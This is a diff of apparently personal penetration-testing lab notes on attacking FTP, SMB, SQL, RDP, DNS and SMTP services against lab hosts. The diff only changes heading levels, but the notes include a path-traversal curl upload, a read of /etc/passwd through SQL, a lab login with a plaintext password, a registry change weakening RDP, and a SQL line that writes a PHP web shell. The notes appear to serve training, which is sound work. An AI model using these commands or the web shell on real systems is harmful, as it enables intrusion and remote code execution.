@@ -1,6 +1,6 @@
 # Attacking Common Services
 
-## FTP
+# FTP
 
 Ways to attack are:
 
@@ -13,7 +13,7 @@ Ways to attack are:
 curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
 ```
 
-## SMB
+# SMB
 
 Ways to attack are:
 
@@ -25,7 +25,7 @@ Ways to attack are:
 
 It is very important to use the --local-auth flag.
 
-## SQL
+# SQL
 
 ```shell-session
 select LOAD_FILE("/etc/passwd");
@@ -46,7 +46,7 @@ It is worth while to note that to connect with a responder hash you need to auth
 sqsh -U 10.129.16.49\\mssqlsvc -P 'princess1' -S 10.129.16.49 -h
 ```
 
-## RDP
+# RDP
 
 We covered all this already in the password attacks section
 
@@ -54,7 +54,7 @@ We covered all this already in the password attacks section
 reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
 ```
 
-## DNS
+# DNS
 
 ```shell-session
 fierce --domain zonetransfer.me
@@ -76,7 +76,7 @@ dig AXFR @<IP> hr.inlanefreight.htb
 
 This challenge really sucked
 
-## SMTP
+# SMTP
 
 ```
 smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
@@ -86,9 +86,9 @@ Hydra to brute force pop3&#x20;
 
 telnet to connect to mail service. Lookup smtp commands
 
-## Assesment
+# Assesment
 
-### Easy
+## Easy
 
 10.129.132.35
 
@@ -102,4 +102,4 @@ Now we can log in to mysql and insert a shell pn the web server to gain RCE and 
 SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/xampp/htdocs/dashboard/shell.php';
 ```
 
-### Medium
+## Medium
